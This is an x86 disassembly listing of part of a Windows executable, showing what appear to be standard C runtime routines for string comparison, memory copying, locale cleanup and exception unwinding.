  426351:	mov    esi,DWORD PTR [esp+0x8]
  426355:	test   esi,esi
  426357:	je     0x4263ad
  426359:	mov    eax,DWORD PTR [esi]
  42635b:	mov    ecx,DWORD PTR ds:0x45c934
  426361:	cmp    eax,DWORD PTR [ecx]
  426363:	je     0x426374
  426365:	cmp    eax,DWORD PTR ds:0x45c904
  42636b:	je     0x426374
  42636d:	push   eax
  42636e:	call   0x42446a
  426373:	pop    ecx
  426374:	mov    eax,DWORD PTR [esi+0x4]
  426377:	mov    ecx,DWORD PTR ds:0x45c934
  42637d:	cmp    eax,DWORD PTR [ecx+0x4]
  426380:	je     0x426391
  426382:	cmp    eax,DWORD PTR ds:0x45c908
  426388:	je     0x426391
  42638a:	push   eax
  42638b:	call   0x42446a
  426390:	pop    ecx
  426391:	mov    esi,DWORD PTR [esi+0x8]
  426394:	mov    eax,ds:0x45c934
  426399:	cmp    esi,DWORD PTR [eax+0x8]
  42639c:	je     0x4263ad
  42639e:	cmp    esi,DWORD PTR ds:0x45c90c
  4263a4:	je     0x4263ad
  4263a6:	push   esi
  4263a7:	call   0x42446a
  4263ac:	pop    ecx
  4263ad:	pop    esi
  4263ae:	ret    
  4263af:	push   esi
  4263b0:	mov    esi,DWORD PTR [esp+0x8]
  4263b4:	test   esi,esi
  4263b6:	je     0x426486
  4263bc:	mov    eax,DWORD PTR [esi+0xc]
  4263bf:	mov    ecx,DWORD PTR ds:0x45c934
  4263c5:	cmp    eax,DWORD PTR [ecx+0xc]
  4263c8:	je     0x4263d9
  4263ca:	cmp    eax,DWORD PTR ds:0x45c910
  4263d0:	je     0x4263d9
  4263d2:	push   eax
  4263d3:	call   0x42446a
  4263d8:	pop    ecx
  4263d9:	mov    eax,DWORD PTR [esi+0x10]
  4263dc:	mov    ecx,DWORD PTR ds:0x45c934
  4263e2:	cmp    eax,DWORD PTR [ecx+0x10]
  4263e5:	je     0x4263f6
  4263e7:	cmp    eax,DWORD PTR ds:0x45c914
  4263ed:	je     0x4263f6
  4263ef:	push   eax
  4263f0:	call   0x42446a
  4263f5:	pop    ecx
  4263f6:	mov    eax,DWORD PTR [esi+0x14]
  4263f9:	mov    ecx,DWORD PTR ds:0x45c934
  4263ff:	cmp    eax,DWORD PTR [ecx+0x14]
  426402:	je     0x426413
  426404:	cmp    eax,DWORD PTR ds:0x45c918
  42640a:	je     0x426413
  42640c:	push   eax
  42640d:	call   0x42446a
  426412:	pop    ecx
  426413:	mov    eax,DWORD PTR [esi+0x18]
  426416:	mov    ecx,DWORD PTR ds:0x45c934
  42641c:	cmp    eax,DWORD PTR [ecx+0x18]
  42641f:	je     0x426430
  426421:	cmp    eax,DWORD PTR ds:0x45c91c
  426427:	je     0x426430
  426429:	push   eax
  42642a:	call   0x42446a
  42642f:	pop    ecx
  426430:	mov    eax,DWORD PTR [esi+0x1c]
  426433:	mov    ecx,DWORD PTR ds:0x45c934
  426439:	cmp    eax,DWORD PTR [ecx+0x1c]
  42643c:	je     0x42644d
  42643e:	cmp    eax,DWORD PTR ds:0x45c920
  426444:	je     0x42644d
  426446:	push   eax
  426447:	call   0x42446a
  42644c:	pop    ecx
  42644d:	mov    eax,DWORD PTR [esi+0x20]
  426450:	mov    ecx,DWORD PTR ds:0x45c934
  426456:	cmp    eax,DWORD PTR [ecx+0x20]
  426459:	je     0x42646a
  42645b:	cmp    eax,DWORD PTR ds:0x45c924
  426461:	je     0x42646a
  426463:	push   eax
  426464:	call   0x42446a
  426469:	pop    ecx
  42646a:	mov    esi,DWORD PTR [esi+0x24]
  42646d:	mov    eax,ds:0x45c934
  426472:	cmp    esi,DWORD PTR [eax+0x24]
  426475:	je     0x426486
  426477:	cmp    esi,DWORD PTR ds:0x45c928
  42647d:	je     0x426486
  42647f:	push   esi
  426480:	call   0x42446a
  426485:	pop    ecx
  426486:	pop    esi
  426487:	ret    
  426488:	int3   
  426489:	int3   
  42648a:	int3   
  42648b:	int3   
  42648c:	int3   
  42648d:	int3   
  42648e:	int3   
  42648f:	int3   
  426490:	push   ebp
  426491:	mov    ebp,esp
  426493:	push   esi
  426494:	xor    eax,eax
  426496:	push   eax
  426497:	push   eax
  426498:	push   eax
  426499:	push   eax
  42649a:	push   eax
  42649b:	push   eax
  42649c:	push   eax
  42649d:	push   eax
  42649e:	mov    edx,DWORD PTR [ebp+0xc]
  4264a1:	lea    ecx,[ecx+0x0]
  4264a4:	mov    al,BYTE PTR [edx]
  4264a6:	or     al,al
  4264a8:	je     0x4264b3
  4264aa:	add    edx,0x1
  4264ad:	bts    DWORD PTR [esp],eax
  4264b1:	jmp    0x4264a4
  4264b3:	mov    esi,DWORD PTR [ebp+0x8]
  4264b6:	or     ecx,0xffffffff
  4264b9:	lea    ecx,[ecx+0x0]
  4264bc:	add    ecx,0x1
  4264bf:	mov    al,BYTE PTR [esi]
  4264c1:	or     al,al
  4264c3:	je     0x4264ce
  4264c5:	add    esi,0x1
  4264c8:	bt     DWORD PTR [esp],eax
  4264cc:	jae    0x4264bc
  4264ce:	mov    eax,ecx
  4264d0:	add    esp,0x20
  4264d3:	pop    esi
  4264d4:	leave  
  4264d5:	ret    
  4264d6:	int3   
  4264d7:	int3   
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	mov    edx,DWORD PTR [esp+0x4]
  4264e4:	mov    ecx,DWORD PTR [esp+0x8]
  4264e8:	test   edx,0x3
  4264ee:	jne    0x42652c
  4264f0:	mov    eax,DWORD PTR [edx]
  4264f2:	cmp    al,BYTE PTR [ecx]
  4264f4:	jne    0x426524
  4264f6:	or     al,al
  4264f8:	je     0x426520
  4264fa:	cmp    ah,BYTE PTR [ecx+0x1]
  4264fd:	jne    0x426524
  4264ff:	or     ah,ah
  426501:	je     0x426520
  426503:	shr    eax,0x10
  426506:	cmp    al,BYTE PTR [ecx+0x2]
  426509:	jne    0x426524
  42650b:	or     al,al
  42650d:	je     0x426520
  42650f:	cmp    ah,BYTE PTR [ecx+0x3]
  426512:	jne    0x426524
  426514:	add    ecx,0x4
  426517:	add    edx,0x4
  42651a:	or     ah,ah
  42651c:	jne    0x4264f0
  42651e:	mov    edi,edi
  426520:	xor    eax,eax
  426522:	ret    
  426523:	nop
  426524:	sbb    eax,eax
  426526:	shl    eax,1
  426528:	add    eax,0x1
  42652b:	ret    
  42652c:	test   edx,0x1
  426532:	je     0x42654c
  426534:	mov    al,BYTE PTR [edx]
  426536:	add    edx,0x1
  426539:	cmp    al,BYTE PTR [ecx]
  42653b:	jne    0x426524
  42653d:	add    ecx,0x1
  426540:	or     al,al
  426542:	je     0x426520
  426544:	test   edx,0x2
  42654a:	je     0x4264f0
  42654c:	mov    ax,WORD PTR [edx]
  42654f:	add    edx,0x2
  426552:	cmp    al,BYTE PTR [ecx]
  426554:	jne    0x426524
  426556:	or     al,al
  426558:	je     0x426520
  42655a:	cmp    ah,BYTE PTR [ecx+0x1]
  42655d:	jne    0x426524
  42655f:	or     ah,ah
  426561:	je     0x426520
  426563:	add    ecx,0x2
  426566:	jmp    0x4264f0
  426568:	int3   
  426569:	int3   
  42656a:	int3   
  42656b:	int3   
  42656c:	int3   
  42656d:	int3   
  42656e:	int3   
  42656f:	int3   
  426570:	mov    eax,DWORD PTR [esp+0xc]
  426574:	test   eax,eax
  426576:	je     0x4265c2
  426578:	mov    edx,DWORD PTR [esp+0x4]
  42657c:	push   esi
  42657d:	push   edi
  42657e:	mov    esi,edx
  426580:	mov    edi,DWORD PTR [esp+0x10]
  426584:	or     edx,edi
  426586:	and    edx,0x3
  426589:	je     0x4265c3
  42658b:	test   eax,0x1
  426590:	je     0x4265a3
  426592:	mov    cl,BYTE PTR [esi]
  426594:	cmp    cl,BYTE PTR [edi]
  426596:	jne    0x4265f0
  426598:	add    esi,0x1
  42659b:	add    edi,0x1
  42659e:	sub    eax,0x1
  4265a1:	je     0x4265c0
  4265a3:	mov    cl,BYTE PTR [esi]
  4265a5:	mov    dl,BYTE PTR [edi]
  4265a7:	cmp    cl,dl
  4265a9:	jne    0x4265f0
  4265ab:	mov    cl,BYTE PTR [esi+0x1]
  4265ae:	mov    dl,BYTE PTR [edi+0x1]
  4265b1:	cmp    cl,dl
  4265b3:	jne    0x4265f0
  4265b5:	add    edi,0x2
  4265b8:	add    esi,0x2
  4265bb:	sub    eax,0x2
  4265be:	jne    0x4265a3
  4265c0:	pop    edi
  4265c1:	pop    esi
  4265c2:	ret    
  4265c3:	mov    ecx,eax
  4265c5:	and    eax,0x3
  4265c8:	shr    ecx,0x2
  4265cb:	je     0x4265f8
  4265cd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4265cf:	je     0x4265f8
  4265d1:	mov    ecx,DWORD PTR [esi-0x4]
  4265d4:	mov    edx,DWORD PTR [edi-0x4]
  4265d7:	cmp    cl,dl
  4265d9:	jne    0x4265eb
  4265db:	cmp    ch,dh
  4265dd:	jne    0x4265eb
  4265df:	shr    ecx,0x10
  4265e2:	shr    edx,0x10
  4265e5:	cmp    cl,dl
  4265e7:	jne    0x4265eb
  4265e9:	cmp    ch,dh
  4265eb:	mov    eax,0x0
  4265f0:	sbb    eax,eax
  4265f2:	pop    edi
  4265f3:	sbb    eax,0xffffffff
  4265f6:	pop    esi
  4265f7:	ret    
  4265f8:	test   eax,eax
  4265fa:	je     0x4265c0
  4265fc:	mov    edx,DWORD PTR [esi]
  4265fe:	mov    ecx,DWORD PTR [edi]
  426600:	cmp    dl,cl
  426602:	jne    0x4265eb
  426604:	sub    eax,0x1
  426607:	je     0x426625
  426609:	cmp    dh,ch
  42660b:	jne    0x4265eb
  42660d:	sub    eax,0x1
  426610:	je     0x426625
  426612:	and    ecx,0xff0000
  426618:	and    edx,0xff0000
  42661e:	cmp    edx,ecx
  426620:	jne    0x4265eb
  426622:	sub    eax,0x1
  426625:	pop    edi
  426626:	pop    esi
  426627:	ret    
  426628:	int3   
  426629:	int3   
  42662a:	int3   
  42662b:	int3   
  42662c:	int3   
  42662d:	int3   
  42662e:	int3   
  42662f:	int3   
  426630:	push   ebp
  426631:	mov    ebp,esp
  426633:	push   edi
  426634:	push   esi
  426635:	push   ebx
  426636:	mov    ecx,DWORD PTR [ebp+0x10]
  426639:	jecxz  0x426662
  42663b:	mov    ebx,ecx
  42663d:	mov    edi,DWORD PTR [ebp+0x8]
  426640:	mov    esi,edi
  426642:	xor    eax,eax
  426644:	repnz scas al,BYTE PTR es:[edi]
  426646:	neg    ecx
  426648:	add    ecx,ebx
  42664a:	mov    edi,esi
  42664c:	mov    esi,DWORD PTR [ebp+0xc]
  42664f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426651:	mov    al,BYTE PTR [esi-0x1]
  426654:	xor    ecx,ecx
  426656:	cmp    al,BYTE PTR [edi-0x1]
  426659:	ja     0x426660
  42665b:	je     0x426662
  42665d:	sub    ecx,0x2
  426660:	not    ecx
  426662:	mov    eax,ecx
  426664:	pop    ebx
  426665:	pop    esi
  426666:	pop    edi
  426667:	leave  
  426668:	ret    
  426669:	int3   
  42666a:	int3   
  42666b:	int3   
  42666c:	int3   
  42666d:	int3   
  42666e:	int3   
  42666f:	int3   
  426670:	push   ebp
  426671:	mov    ebp,esp
  426673:	push   esi
  426674:	xor    eax,eax
  426676:	push   eax
  426677:	push   eax
  426678:	push   eax
  426679:	push   eax
  42667a:	push   eax
  42667b:	push   eax
  42667c:	push   eax
  42667d:	push   eax
  42667e:	mov    edx,DWORD PTR [ebp+0xc]
  426681:	lea    ecx,[ecx+0x0]
  426684:	mov    al,BYTE PTR [edx]
  426686:	or     al,al
  426688:	je     0x426693
  42668a:	add    edx,0x1
  42668d:	bts    DWORD PTR [esp],eax
  426691:	jmp    0x426684
  426693:	mov    esi,DWORD PTR [ebp+0x8]
  426696:	mov    edi,edi
  426698:	mov    al,BYTE PTR [esi]
  42669a:	or     al,al
  42669c:	je     0x4266aa
  42669e:	add    esi,0x1
  4266a1:	bt     DWORD PTR [esp],eax
  4266a5:	jae    0x426698
  4266a7:	lea    eax,[esi-0x1]
  4266aa:	add    esp,0x20
  4266ad:	pop    esi
  4266ae:	leave  
  4266af:	ret    
  4266b0:	push   ebp
  4266b1:	mov    ebp,esp
  4266b3:	push   ebx
  4266b4:	push   esi
  4266b5:	push   edi
  4266b6:	push   ebp
  4266b7:	push   0x0
  4266b9:	push   0x0
  4266bb:	push   0x4266c8
  4266c0:	push   DWORD PTR [ebp+0x8]
  4266c3:	call   0x42713e
  4266c8:	pop    ebp
  4266c9:	pop    edi
  4266ca:	pop    esi
  4266cb:	pop    ebx
  4266cc:	mov    esp,ebp
  4266ce:	pop    ebp
  4266cf:	ret    
  4266d0:	mov    ecx,DWORD PTR [esp+0x4]
  4266d4:	test   DWORD PTR [ecx+0x4],0x6
  4266db:	mov    eax,0x1
  4266e0:	je     0x4266f1
  4266e2:	mov    eax,DWORD PTR [esp+0x8]
  4266e6:	mov    edx,DWORD PTR [esp+0x10]
  4266ea:	mov    DWORD PTR [edx],eax
  4266ec:	mov    eax,0x3
  4266f1:	ret    
  4266f2:	push   ebx
  4266f3:	push   esi
  4266f4:	push   edi
  4266f5:	mov    eax,DWORD PTR [esp+0x10]
  4266f9:	push   eax
  4266fa:	push   0xfffffffe
  4266fc:	push   0x4266d0
  426701:	push   DWORD PTR fs:0x0
  426708:	mov    DWORD PTR fs:0x0,esp
  42670f:	mov    eax,DWORD PTR [esp+0x20]
  426713:	mov    ebx,DWORD PTR [eax+0x8]
  426716:	mov    esi,DWORD PTR [eax+0xc]
  426719:	cmp    esi,0xffffffff
  42671c:	je     0x42674c
  42671e:	cmp    esi,DWORD PTR [esp+0x24]
  426722:	je     0x42674c
  426724:	lea    esi,[esi+esi*2]
  426727:	mov    ecx,DWORD PTR [ebx+esi*4]
  42672a:	mov    DWORD PTR [esp+0x8],ecx
  42672e:	mov    DWORD PTR [eax+0xc],ecx
  426731:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426736:	jne    0x42674a
  426738:	push   0x101
  42673d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426741:	call   0x426786
  426746:	call   DWORD PTR [ebx+esi*4+0x8]
  42674a:	jmp    0x42670f
  42674c:	pop    DWORD PTR fs:0x0
  426753:	add    esp,0xc
  426756:	pop    edi
  426757:	pop    esi
  426758:	pop    ebx
  426759:	ret    
  42675a:	xor    eax,eax
  42675c:	mov    ecx,DWORD PTR fs:0x0
  426763:	cmp    DWORD PTR [ecx+0x4],0x4266d0
  42676a:	jne    0x42677c
  42676c:	mov    edx,DWORD PTR [ecx+0xc]
  42676f:	mov    edx,DWORD PTR [edx+0xc]
  426772:	cmp    DWORD PTR [ecx+0x8],edx
  426775:	jne    0x42677c
  426777:	mov    eax,0x1
  42677c:	ret    
  42677d:	push   ebx
  42677e:	push   ecx
  42677f:	mov    ebx,0x45c94c
  426784:	jmp    0x426790
  426786:	push   ebx
  426787:	push   ecx
  426788:	mov    ebx,0x45c94c
  42678d:	mov    ecx,DWORD PTR [ebp+0x8]
  426790:	mov    DWORD PTR [ebx+0x8],ecx
  426793:	mov    DWORD PTR [ebx+0x4],eax
  426796:	mov    DWORD PTR [ebx+0xc],ebp
  426799:	pop    ecx
  42679a:	pop    ebx
  42679b:	ret    0x4
  42679e:	int3   
  42679f:	int3   
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   edi
  4267a4:	push   esi
  4267a5:	mov    esi,DWORD PTR [ebp+0xc]
  4267a8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267ab:	mov    edi,DWORD PTR [ebp+0x8]
  4267ae:	mov    eax,ecx
  4267b0:	mov    edx,ecx
  4267b2:	add    eax,esi
  4267b4:	cmp    edi,esi
  4267b6:	jbe    0x4267c0
  4267b8:	cmp    edi,eax
  4267ba:	jb     0x42693c
  4267c0:	test   edi,0x3
  4267c6:	jne    0x4267dc
  4267c8:	shr    ecx,0x2
  4267cb:	and    edx,0x3
  4267ce:	cmp    ecx,0x8
  4267d1:	jb     0x4267fc
  4267d3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267d5:	jmp    DWORD PTR [edx*4+0x4268ec]
  4267dc:	mov    eax,edi
  4267de:	mov    edx,0x3
  4267e3:	sub    ecx,0x4
  4267e6:	jb     0x4267f4
  4267e8:	and    eax,0x3
  4267eb:	add    ecx,eax
  4267ed:	jmp    DWORD PTR [eax*4+0x426800]
  4267f4:	jmp    DWORD PTR [ecx*4+0x4268fc]
  4267fb:	nop
  4267fc:	jmp    DWORD PTR [ecx*4+0x426880]
  426803:	nop
  426804:	adc    BYTE PTR [eax+0x42],ch
  426807:	add    BYTE PTR [eax+ebp*2],bh
  42680a:	inc    edx
  42680b:	add    BYTE PTR [eax+0x68],ah
  42680e:	inc    edx
  42680f:	add    BYTE PTR [ebx],ah
  426811:	ror    DWORD PTR [edx-0x75f877fa],1
  426817:	inc    esi
  426818:	add    DWORD PTR [eax+0x468a0147],ecx
  42681e:	add    al,cl
  426820:	jmp    0x289f027
  426825:	add    esi,0x3
  426828:	add    edi,0x3
  42682b:	cmp    ecx,0x8
  42682e:	jb     0x4267fc
  426830:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426832:	jmp    DWORD PTR [edx*4+0x4268ec]
  426839:	lea    ecx,[ecx+0x0]
  42683c:	and    edx,ecx
  42683e:	mov    al,BYTE PTR [esi]
  426840:	mov    BYTE PTR [edi],al
  426842:	mov    al,BYTE PTR [esi+0x1]
  426845:	shr    ecx,0x2
  426848:	mov    BYTE PTR [edi+0x1],al
  42684b:	add    esi,0x2
  42684e:	add    edi,0x2
  426851:	cmp    ecx,0x8
  426854:	jb     0x4267fc
  426856:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426858:	jmp    DWORD PTR [edx*4+0x4268ec]
  42685f:	nop
  426860:	and    edx,ecx
  426862:	mov    al,BYTE PTR [esi]
  426864:	mov    BYTE PTR [edi],al
  426866:	add    esi,0x1
  426869:	shr    ecx,0x2
  42686c:	add    edi,0x1
  42686f:	cmp    ecx,0x8
  426872:	jb     0x4267fc
  426874:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426876:	jmp    DWORD PTR [edx*4+0x4268ec]
  42687d:	lea    ecx,[ecx+0x0]
  426880:	jecxz  0x4268ea
  426882:	inc    edx
  426883:	add    al,dl
  426885:	push   0x68c80042
  42688a:	inc    edx
  42688b:	add    al,al
  42688d:	push   0x68b80042
  426892:	inc    edx
  426893:	add    BYTE PTR [eax-0x57ffbd98],dh
  426899:	push   0x68a00042
  42689e:	inc    edx
  42689f:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268a5:	inc    esp
  4268a6:	(bad)  
  4268a7:	in     al,0x8b
  4268a9:	inc    esp
  4268aa:	mov    gs,eax
  4268ac:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4268b0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4268b4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4268b8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4268bc:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4268c0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4268c4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4268c8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4268cc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4268d0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4268d4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4268d8:	lea    eax,[ecx*4+0x0]
  4268df:	add    esi,eax
  4268e1:	add    edi,eax
  4268e3:	jmp    DWORD PTR [edx*4+0x4268ec]
  4268ea:	mov    edi,edi
  4268ec:	cld    
  4268ed:	push   0x69040042
  4268f2:	inc    edx
  4268f3:	add    BYTE PTR [eax],dl
  4268f5:	imul   eax,DWORD PTR [edx+0x0],0x426924
  4268fc:	mov    eax,DWORD PTR [ebp+0x8]
  4268ff:	pop    esi
  426900:	pop    edi
  426901:	leave  
  426902:	ret    
  426903:	nop
  426904:	mov    al,BYTE PTR [esi]
  426906:	mov    BYTE PTR [edi],al
  426908:	mov    eax,DWORD PTR [ebp+0x8]
  42690b:	pop    esi
  42690c:	pop    edi
  42690d:	leave  
  42690e:	ret    
  42690f:	nop
  426910:	mov    al,BYTE PTR [esi]
  426912:	mov    BYTE PTR [edi],al
  426914:	mov    al,BYTE PTR [esi+0x1]
  426917:	mov    BYTE PTR [edi+0x1],al
  42691a:	mov    eax,DWORD PTR [ebp+0x8]
  42691d:	pop    esi
  42691e:	pop    edi
  42691f:	leave  
  426920:	ret    
  426921:	lea    ecx,[ecx+0x0]
  426924:	mov    al,BYTE PTR [esi]
  426926:	mov    BYTE PTR [edi],al
  426928:	mov    al,BYTE PTR [esi+0x1]
  42692b:	mov    BYTE PTR [edi+0x1],al
  42692e:	mov    al,BYTE PTR [esi+0x2]
  426931:	mov    BYTE PTR [edi+0x2],al
  426934:	mov    eax,DWORD PTR [ebp+0x8]
  426937:	pop    esi
  426938:	pop    edi
  426939:	leave  
  42693a:	ret    
  42693b:	nop
  42693c:	lea    esi,[ecx+esi*1-0x4]
  426940:	lea    edi,[ecx+edi*1-0x4]
  426944:	test   edi,0x3
  42694a:	jne    0x426970
  42694c:	shr    ecx,0x2
  42694f:	and    edx,0x3
  426952:	cmp    ecx,0x8
  426955:	jb     0x426964
  426957:	std    
  426958:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42695a:	cld    
  42695b:	jmp    DWORD PTR [edx*4+0x426a88]
  426962:	mov    edi,edi
  426964:	neg    ecx
  426966:	jmp    DWORD PTR [ecx*4+0x426a38]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	mov    eax,edi
  426972:	mov    edx,0x3
  426977:	cmp    ecx,0x4
  42697a:	jb     0x426988
  42697c:	and    eax,0x3
  42697f:	sub    ecx,eax
  426981:	jmp    DWORD PTR [eax*4+0x42698c]
  426988:	jmp    DWORD PTR [ecx*4+0x426a88]
  42698f:	nop
  426990:	pushf  
  426991:	imul   eax,DWORD PTR [edx+0x0],0x4269c0
  426998:	call   0x8a42ac06
  42699d:	inc    esi
  42699e:	add    esp,DWORD PTR [ebx]
  4269a0:	ror    DWORD PTR [eax-0x117cfcb9],1
  4269a6:	add    ecx,eax
  4269a8:	jmp    0x231ecaf
  4269ad:	cmp    ecx,0x8
  4269b0:	jb     0x426964
  4269b2:	std    
  4269b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269b5:	cld    
  4269b6:	jmp    DWORD PTR [edx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    al,BYTE PTR [esi+0x3]
  4269c3:	and    edx,ecx
  4269c5:	mov    BYTE PTR [edi+0x3],al
  4269c8:	mov    al,BYTE PTR [esi+0x2]
  4269cb:	shr    ecx,0x2
  4269ce:	mov    BYTE PTR [edi+0x2],al
  4269d1:	sub    esi,0x2
  4269d4:	sub    edi,0x2
  4269d7:	cmp    ecx,0x8
  4269da:	jb     0x426964
  4269dc:	std    
  4269dd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269df:	cld    
  4269e0:	jmp    DWORD PTR [edx*4+0x426a88]
  4269e7:	nop
  4269e8:	mov    al,BYTE PTR [esi+0x3]
  4269eb:	and    edx,ecx
  4269ed:	mov    BYTE PTR [edi+0x3],al
  4269f0:	mov    al,BYTE PTR [esi+0x2]
  4269f3:	mov    BYTE PTR [edi+0x2],al
  4269f6:	mov    al,BYTE PTR [esi+0x1]
  4269f9:	shr    ecx,0x2
  4269fc:	mov    BYTE PTR [edi+0x1],al
  4269ff:	sub    esi,0x3
  426a02:	sub    edi,0x3
  426a05:	cmp    ecx,0x8
  426a08:	jb     0x426964
  426a0e:	std    
  426a0f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a11:	cld    
  426a12:	jmp    DWORD PTR [edx*4+0x426a88]
  426a19:	lea    ecx,[ecx+0x0]
  426a1c:	cmp    al,0x6a
  426a1e:	inc    edx
  426a1f:	add    BYTE PTR [edx+ebp*2+0x42],al
  426a23:	add    BYTE PTR [edx+ebp*2+0x42],cl
  426a27:	add    BYTE PTR [edx+ebp*2+0x42],dl
  426a2b:	add    BYTE PTR [edx+ebp*2+0x42],bl
  426a2f:	add    BYTE PTR [edx+ebp*2+0x42],ah
  426a33:	add    BYTE PTR [edx+ebp*2+0x42],ch
  426a37:	add    BYTE PTR [edi+0x6a],bh
  426a3a:	inc    edx
  426a3b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a41:	inc    esp
  426a42:	(bad)  
  426a43:	sbb    al,0x8b
  426a45:	inc    esp
  426a46:	mov    ds,WORD PTR [eax]
  426a48:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a4c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426a50:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426a54:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426a58:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426a5c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426a60:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426a64:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426a68:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426a6c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426a70:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426a74:	lea    eax,[ecx*4+0x0]
  426a7b:	add    esi,eax
  426a7d:	add    edi,eax
  426a7f:	jmp    DWORD PTR [edx*4+0x426a88]
  426a86:	mov    edi,edi
  426a88:	cwde   
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [eax-0x4fffbd96],ah
  426a91:	push   0x42
  426a93:	add    ah,al
  426a95:	push   0x42
  426a97:	add    BYTE PTR [ebx+0x5f5e0845],cl
  426a9d:	leave  
  426a9e:	ret    
  426a9f:	nop
  426aa0:	mov    al,BYTE PTR [esi+0x3]
  426aa3:	mov    BYTE PTR [edi+0x3],al
  426aa6:	mov    eax,DWORD PTR [ebp+0x8]
  426aa9:	pop    esi
  426aaa:	pop    edi
  426aab:	leave  
  426aac:	ret    
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
  426ab3:	mov    BYTE PTR [edi+0x3],al
  426ab6:	mov    al,BYTE PTR [esi+0x2]
  426ab9:	mov    BYTE PTR [edi+0x2],al
  426abc:	mov    eax,DWORD PTR [ebp+0x8]
  426abf:	pop    esi
  426ac0:	pop    edi
  426ac1:	leave  
  426ac2:	ret    
  426ac3:	nop
  426ac4:	mov    al,BYTE PTR [esi+0x3]
  426ac7:	mov    BYTE PTR [edi+0x3],al
  426aca:	mov    al,BYTE PTR [esi+0x2]
  426acd:	mov    BYTE PTR [edi+0x2],al
  426ad0:	mov    al,BYTE PTR [esi+0x1]
  426ad3:	mov    BYTE PTR [edi+0x1],al
  426ad6:	mov    eax,DWORD PTR [ebp+0x8]
  426ad9:	pop    esi
  426ada:	pop    edi
  426adb:	leave  
  426adc:	ret    
  426add:	push   ebp
  426ade:	mov    ebp,esp
  426ae0:	sub    esp,0xc
  426ae3:	mov    eax,ds:0x45c430
  426ae8:	xor    eax,DWORD PTR [ebp+0x4]
  426aeb:	and    BYTE PTR [ebp-0x6],0x0
  426aef:	push   0x6
  426af1:	mov    DWORD PTR [ebp-0x4],eax
  426af4:	lea    eax,[ebp-0xc]
  426af7:	push   eax
  426af8:	push   0x1004
  426afd:	push   DWORD PTR [ebp+0x8]
  426b00:	call   DWORD PTR ds:0x4280dc
  426b06:	test   eax,eax
  426b08:	jne    0x426b0f
  426b0a:	or     eax,0xffffffff
  426b0d:	jmp    0x426b19
  426b0f:	lea    eax,[ebp-0xc]
  426b12:	push   eax
  426b13:	call   0x426e1e
  426b18:	pop    ecx
  426b19:	mov    ecx,DWORD PTR [ebp-0x4]
  426b1c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b1f:	call   0x423f2c
  426b24:	leave  
  426b25:	ret    
  426b26:	push   0x38
  426b28:	push   0x428ea8
  426b2d:	call   0x423858
  426b32:	mov    eax,ds:0x45c430
  426b37:	xor    eax,DWORD PTR [ebp+0x4]
  426b3a:	mov    DWORD PTR [ebp-0x1c],eax
  426b3d:	xor    edi,edi
  426b3f:	mov    DWORD PTR [ebp-0x20],edi
  426b42:	mov    DWORD PTR [ebp-0x24],edi
  426b45:	mov    eax,DWORD PTR [ebp+0x14]
  426b48:	mov    ebx,DWORD PTR [eax]
  426b4a:	mov    DWORD PTR [ebp-0x28],ebx
  426b4d:	mov    DWORD PTR [ebp-0x2c],edi
  426b50:	mov    eax,DWORD PTR [ebp+0x8]
  426b53:	cmp    eax,DWORD PTR [ebp+0xc]
  426b56:	je     0x426ccf
  426b5c:	lea    ecx,[ebp-0x40]
  426b5f:	push   ecx
  426b60:	push   eax
  426b61:	mov    esi,DWORD PTR ds:0x4280a0
  426b67:	call   esi
  426b69:	test   eax,eax
  426b6b:	je     0x426b8d
  426b6d:	cmp    DWORD PTR [ebp-0x40],0x1
  426b71:	jne    0x426b8d
  426b73:	lea    eax,[ebp-0x40]
  426b76:	push   eax
  426b77:	push   DWORD PTR [ebp+0xc]
  426b7a:	call   esi
  426b7c:	test   eax,eax
  426b7e:	je     0x426b8d
  426b80:	cmp    DWORD PTR [ebp-0x40],0x1
  426b84:	jne    0x426b8d
